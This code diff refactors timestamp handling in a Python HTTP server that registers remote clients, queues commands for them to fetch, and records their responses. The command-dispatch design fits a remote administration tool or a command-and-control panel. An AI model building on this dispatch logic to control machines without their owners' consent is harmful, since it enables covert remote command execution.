@@ -1514,7 +1514,10 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             incoming_user = data.get('user', 'Unknown')
             incoming_computer = data.get('computer', 'Unknown')
             incoming_os = data.get('os', 'Unknown')
-
+            
+            # ⚡ التعديل: استخدام متغير واحد للوقت
+            current_time = datetime.now().isoformat()
+    
             if incoming_user == 'Unknown' and '-' in client_id:
                 try:
                     parts = client_id.split('-')
@@ -1528,7 +1531,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             for cid, client_data in self.sessions.items():
                 current_user = client_data.get('user', '')
                 current_computer = client_data.get('computer', '')
-
+    
                 if (current_user == incoming_user and 
                     current_computer == incoming_computer and 
                     incoming_user != 'Unknown' and 
@@ -1538,18 +1541,20 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 
             if existing_client is None and client_id in self.sessions:
                 existing_client = client_id
-
+    
             if existing_client:
-                self.sessions[existing_client]['last_seen'] = datetime.now().isoformat()
+                # ⚡ التعديل: استخدام المتغير الموحد
+                self.sessions[existing_client]['last_seen'] = current_time
                 self.sessions[existing_client]['status'] = 'online'
                 self.sessions[existing_client]['ip'] = client_ip
-
+    
                 if incoming_os != 'Unknown':
                     self.sessions[existing_client]['os'] = incoming_os
-
+    
                 print(f" INSTANT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': existing_client, 'instant': True})
             else:
+                # ⚡ التعديل: استخدام المتغير الموحد
                 self.sessions[client_id] = {
                     'id': client_id,
                     'ip': client_ip,
@@ -1557,8 +1562,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     'computer': incoming_computer,
                     'os': incoming_os,
                     'user': incoming_user,
-                    'first_seen': datetime.now().isoformat(),
-                    'last_seen': datetime.now().isoformat(),
+                    'first_seen': current_time,  # ⚡ نفس التنسيق
+                    'last_seen': current_time,   # ⚡ نفس التنسيق
                     'pending_command': None,
                     'last_response': None,
                     'status': 'online'
@@ -1572,26 +1577,47 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             active_clients = []
         
             for client_id, client_data in list(self.sessions.items()):
-                last_seen = datetime.fromisoformat(client_data['last_seen'])
-                time_diff = (current_time - last_seen).total_seconds()
-            
-                if time_diff < 300:  # 5 minutes
-                    client_data['is_online'] = time_diff < 30  # ⚡ 5 seconds for online
-                    client_data['last_seen_seconds'] = time_diff
+                try:
+                    # ⚡ التعديل: معالجة الأخطاء في تحويل الوقت
+                    last_seen_str = client_data['last_seen']
+                    if isinstance(last_seen_str, str):
+                        last_seen = datetime.fromisoformat(last_seen_str)
+                    else:
+                        # إذا لم يكن نصاً، استخدم الوقت الحالي
+                        last_seen = current_time
+                        client_data['last_seen'] = current_time.isoformat()
+                    
+                    time_diff = (current_time - last_seen).total_seconds()
+                
+                    if time_diff < 300:  # 5 minutes for cleanup
+                        # ⚡ التعديل: استخدام 30 ثانية موحدة للنشاط
+                        client_data['is_online'] = time_diff < 30  # 30 seconds for online
+                        client_data['last_seen_seconds'] = time_diff
+                        active_clients.append(client_data)
+                    else:
+                        del self.sessions[client_id]
+                        print(f"INSTANT Removed inactive: {client_id}")
+                        
+                except Exception as e:
+                    # ⚡ التعديل: معالجة الأخطاء وإصلاح البيانات التالفة
+                    print(f"INSTANT Time error for {client_id}: {e}")
+                    # إصلاح البيانات
+                    client_data['last_seen'] = current_time.isoformat()
+                    client_data['is_online'] = True
+                    client_data['last_seen_seconds'] = 0
                     active_clients.append(client_data)
-                else:
-                    del self.sessions[client_id]
-                    print(f"INSTANT Removed inactive: {client_id}")
         
-            self.send_json(active_clients)    
+            self.send_json(active_clients)   
     def handle_get_commands(self):
         with self.session_lock:
+            # ⚡ التعديل: استخدام متغير الوقت الموحد
+            current_time = datetime.now().isoformat()
             parsed = urllib.parse.urlparse(self.path)
             query = urllib.parse.parse_qs(parsed.query)
             client_id = query.get('client', [None])[0]
             
             if client_id and client_id in self.sessions:
-                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
+                self.sessions[client_id]['last_seen'] = current_time
                 pending_command = self.sessions[client_id]['pending_command']
                 
                 if pending_command:
@@ -1604,12 +1630,13 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     
     def handle_execute_command(self, data):
         with self.session_lock:
+            current_time = datetime.now().isoformat()
             client_id = data.get('client_id')
             command = data.get('command')
             
             if client_id in self.sessions:
                 self.sessions[client_id]['pending_command'] = command
-                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
+                self.sessions[client_id]['last_seen'] = current_time
                 self.send_json({'success': True, 'executed_instantly': True})
                 
                 if hasattr(self, 'cursor'):
@@ -1642,9 +1669,12 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             response = data.get('response')
             command = data.get('command')
             
+            # ⚡ التعديل: استخدام متغير الوقت الموحد
+            current_time = datetime.now().isoformat()
+            
             if client_id in self.sessions:
                 self.sessions[client_id]['last_response'] = response
-                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
+                self.sessions[client_id]['last_seen'] = current_time  # ⚡ نفس التنسيق
                 
                 if hasattr(self, 'cursor'):
                     self.cursor.execute(
